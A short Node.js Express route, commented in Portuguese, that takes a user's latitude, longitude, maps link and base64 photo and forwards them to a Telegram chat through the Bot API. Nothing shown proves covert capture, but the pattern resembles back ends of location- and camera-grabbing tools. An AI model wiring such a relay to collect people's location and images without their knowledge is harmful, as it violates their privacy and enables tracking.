const FormData = require("form-data");

app.post("/send-data", async (req, res) => {
  const { latitude, longitude, maps, photo } = req.body;

  try {
    // Envia a mensagem de localização
    const message = `📍 Localização do usuário:\nLatitude: ${latitude}\nLongitude: ${longitude}\n${maps}`;
    await axios.post(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
      }
    );

    if (photo) {
      // Remove o prefixo da base64
      const base64Data = photo.replace(/^data:image\/\w+;base64,/, "");
      const buffer = Buffer.from(base64Data, "base64");

      const form = new FormData();
      form.append("chat_id", TELEGRAM_CHAT_ID);
      form.append("photo", buffer, {
        filename: "photo.png",
        contentType: "image/png",
      });

      // Envio via axios usando os headers corretos do form-data
      await axios.post(
        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`,
        form,
        { headers: form.getHeaders() }
      );
    }

    res.json({ success: true });
  } catch (error) {
    console.error("Erro ao enviar para Telegram:", error.response?.data || error.message || error);
    res.status(500).json({ success: false, message: "Erro ao enviar os dados." });
  }
});

